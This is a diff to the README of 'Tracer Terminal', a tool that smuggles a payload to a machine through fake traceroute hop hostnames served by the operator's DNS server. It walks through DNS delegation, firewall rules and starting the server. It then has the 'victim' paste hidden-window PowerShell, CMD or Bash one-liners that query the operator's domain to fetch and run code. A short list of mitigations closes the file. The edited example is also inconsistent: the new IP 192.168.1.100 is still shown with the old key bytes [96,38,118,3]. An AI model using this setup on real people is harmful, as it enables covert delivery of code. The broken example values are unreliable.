@@ -69,47 +69,114 @@ Each fake hop carries a PTR hostname up to 253 characters (RFC 1035). The shard 
 - Windows: `tracert.exe` + `powershell.exe` (built-in)
 - Linux/macOS: `traceroute` + `bash` + `grep` (standard)
 
-## DNS Setup (Any Registrar)
+## Quick Start
 
-Two DNS records at your domain registrar:
+### Step 1: DNS Configuration (One-Time Setup)
 
-**1. Glue A Record** (nameserver address):
+Go to your domain registrar's DNS management panel and add two records. This delegates a subdomain zone to your own server so it becomes the authoritative DNS for all `*.lab.yourdomain.com` queries.
+
+**Record 1 -- Glue A Record** (tells the internet where your nameserver lives):
 
 | Name | Type | TTL | Value |
 |------|------|-----|-------|
-| `ns1` | A | 30 min | `YOUR_SERVER_IP` |
+| `ns1` | A | 30 min | `YOUR_SERVER_PUBLIC_IP` |
 
-**2. NS Delegation** (delegates subdomain zone):
+**Record 2 -- NS Delegation** (delegates the `lab` subdomain to your nameserver):
 
 | Name | Type | TTL | Value |
 |------|------|-----|-------|
 | `lab` | NS | 30 min | `ns1.yourdomain.com` |
 
-This routes all `*.lab.yourdomain.com` queries to your server on port 53.
+**Example** using `mydomain.net` with server at `192.168.1.100`:
 
-**Cloudflare note**: Use "DNS Only" (grey cloud) for the ns1 A record.
+| Name | Type | TTL | Value |
+|------|------|-----|-------|
+| `ns1` | A | 30 min | `192.168.1.100` |
+| `lab` | NS | 30 min | `ns1.mydomain.net` |
 
-## Server Setup
+After this, any DNS query for `*.lab.mydomain.net` anywhere in the world will be routed to your server on port 53.
+
+**Registrar-specific notes:**
+- **Cloudflare**: The `ns1` A record must be "DNS Only" (grey cloud icon). Cloudflare's proxy does not forward port 53.
+- **GoDaddy / Namecheap / Porkbun**: Standard DNS panel, add the records directly.
+- **Home IP (Comcast, etc.)**: Works if you have a static IP. Port 53 may be blocked by some residential ISPs -- verify with `nslookup test.lab.yourdomain.com` from an external machine.
+
+Allow up to 30 minutes for DNS propagation.
+
+### Step 2: Configure the Server
+
+Edit `server/config.py` and set your domain and public IP:
+
+```python
+DOMAIN_ZONE = "lab.yourdomain.com"   # must match your NS delegation
+SERVER_IP = "YOUR_SERVER_PUBLIC_IP"   # the IP from your glue A record
+```
+
+The `SERVER_IP` also becomes the 4-byte XOR encryption key (its octets), and is what `tracert` displays in its header line.
+
+### Step 3: Install Dependencies
 
 ```bash
-# Install dependencies
 pip install -r requirements.txt
+```
 
-# Open firewall (Linux)
+Requires only `dnslib` and `scapy`. Python 3.10+ recommended.
+
+### Step 4: Open Firewall and Suppress Kernel ICMP
+
+The server needs port 53 (DNS) and ICMP open inbound. On Linux, the kernel must NOT reply to ICMP Echo Requests -- Scapy handles that instead to create the fake hops.
+
+```bash
+# Allow DNS and ICMP inbound
 sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
+sudo iptables -A INPUT -p tcp --dport 53 -j ACCEPT
 sudo iptables -A INPUT -p icmp -j ACCEPT
-# Suppress kernel ICMP replies so Scapy handles them
-sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP
 
-# Start orchestrator with a payload
+# CRITICAL: suppress kernel ICMP echo-reply so only Scapy responds
+sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP
+```
+
+If behind a home router, also port-forward UDP 53, TCP 53, and ICMP to your server's local IP.
+
+### Step 5: Start the Orchestrator
+
+Run from the project root directory (`tracerterminal/`):
+
+```bash
+# Deliver the PowerShell chat client to Windows targets
 sudo python -m server.orchestrator --payload clients/chat_client.ps1
 
-# Or specify custom domain/IP
-sudo python -m server.orchestrator \
-  --payload clients/chat_client.sh \
-  --domain lab.yourdomain.com \
-  --ip 1.2.3.4
+# Or the Bash client for Linux/macOS targets
+sudo python -m server.orchestrator --payload clients/chat_client.sh
+
+# Or the CMD batch client
+sudo python -m server.orchestrator --payload clients/chat_client.bat
 ```
+
+You can also override config values from the command line:
+
+```bash
+sudo python -m server.orchestrator \
+  --payload clients/chat_client.ps1 \
+  --domain lab.mydomain.net \
+  --ip 192.168.1.100
+```
+
+Root/admin is required for Scapy raw sockets and binding to port 53.
+
+### Step 6: Verify DNS Delegation
+
+From any external machine (not the server), run:
+
+```
+nslookup test.lab.yourdomain.com
+```
+
+You should see the query arrive in the orchestrator's console output. If it does, the full NS delegation chain is working and the server is ready for clients.
+
+### Step 7: Send the Bootstrap to a Client
+
+Give the target the appropriate one-liner from `bootstrap/`. See [clients/README.md](clients/README.md) for details on how each bootstrap and chat client works.
 
 ## Usage
 
@@ -117,8 +184,8 @@ sudo python -m server.orchestrator \
 
 ```
 [*] Tracer Terminal Orchestrator
-[*] Domain zone: lab.quasarke.net
-[*] Server IP / XOR key: 96.38.118.3 -> [96, 38, 118, 3]
+[*] Domain zone: lab.mydomain.net
+[*] Server IP / XOR key: 192.168.1.100 -> [96, 38, 118, 3]
 [*] Payload loaded: clients/chat_client.ps1 (1009 bytes)
 [*] Payload encoded into 9 data shards + end marker
 [*] Server ready. Waiting for connections...
@@ -145,19 +212,19 @@ The victim pastes one of these commands. Each uses only built-in OS tools:
 
 **PowerShell** (copy-paste into PowerShell or Win+R):
 ```
-powershell -w h -nop -c "$z='lab.quasarke.net';$t=tracert payload.$z;..."
+powershell -w h -nop -c "$z='lab.mydomain.net';$t=tracert payload.$z;..."
 ```
 (See `bootstrap/bootstrap_ps.txt` for the full command)
 
 **CMD** (copy-paste into cmd.exe):
 ```
-@tracert payload.lab.quasarke.net>%tmp%\tt.txt&powershell -nop -w h -c "..."
+@tracert payload.lab.mydomain.net>%tmp%\tt.txt&powershell -nop -w h -c "..."
 ```
 (See `bootstrap/bootstrap_cmd.txt` for the full command)
 
 **Bash** (copy-paste into terminal):
 ```bash
-z=lab.quasarke.net;t=$(traceroute payload.$z 2>&1);k=(96 38 118 3);...
+z=lab.mydomain.net;t=$(traceroute payload.$z 2>&1);k=(192 168 1 100);...
 ```
 (See `bootstrap/bootstrap_bash.txt` for the full command)
 
@@ -201,7 +268,7 @@ Disconnected.
 ## Encryption
 
 - **Algorithm**: XOR with 4-byte repeating key
-- **Key source**: Server IP address octets (e.g., `96.38.118.3` = `[0x60, 0x26, 0x76, 0x03]`)
+- **Key source**: Server IP address octets (e.g., `192.168.1.100` = `[0x60, 0x26, 0x76, 0x03]`)
 - **Encoding**: Hex (0-9, a-f) for DNS-safe transport
 - **Compression**: zlib applied before encryption for payload delivery
 
@@ -249,4 +316,3 @@ Related work:
 - DNS firewalls that strip shell-sensitive characters from PTR responses
 - Block ICMP Time Exceeded from unexpected sources
 - Rate-limit DNS PTR queries from single hosts
-# Tracer-Talk
